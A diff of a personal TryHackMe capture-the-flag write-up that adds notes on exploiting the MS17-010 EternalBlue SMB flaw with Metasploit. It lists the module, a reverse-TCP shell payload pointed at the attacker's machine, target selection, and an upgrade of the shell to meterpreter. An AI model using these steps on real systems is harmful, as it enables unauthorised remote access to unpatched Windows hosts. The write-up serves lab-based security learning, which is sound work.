@@ -2,7 +2,7 @@
 
 ## Basic Info
 - **Platform**: TryHackMe
-- **IP Address**: 10.10.92.152
+- **IP Address**: 10.10.63.213
 - **Date**: 05/03/2025
 - **Difficulty**: Easy
 - **Tags**: Enumeration, Exploitation, Privilege Escalation
@@ -77,14 +77,29 @@ Host script results:
 ### Method Used:
 - Vulnerability: ms17-010
 - Exploit Used: exploit/windows/smb/ms17_010_eternalblue AKA eternalblue
-- Shell Access Gained:
+- Shell Access Gained: Yes, reverse shell via Metasploit
 
 **Commands:**
 ```bash
 python3 exploit.py <target>
 ```
-
+mfsconsole - to start MetaSploit
+	set the RHOST to <targetip>
+	set the LHOST to <hackermachine>
+	set payload windows/x64/shell/reverse_tcp - set the payload to get a reverse shell. 
+	show targets - to show potentional targets you can set which varies of the OS that the target has
+	set target 1 - to select target os
+	run - then run the exploit
 ---
+
+```bash
+CTRL+Z to background the shell
+Then ran "search shell_to_meterpreter"
+use 0 - to choose the exploit
+sessions -l - to list the shells that we have.
+set session 1
+
+```
 
 ## Post Exploitation
 
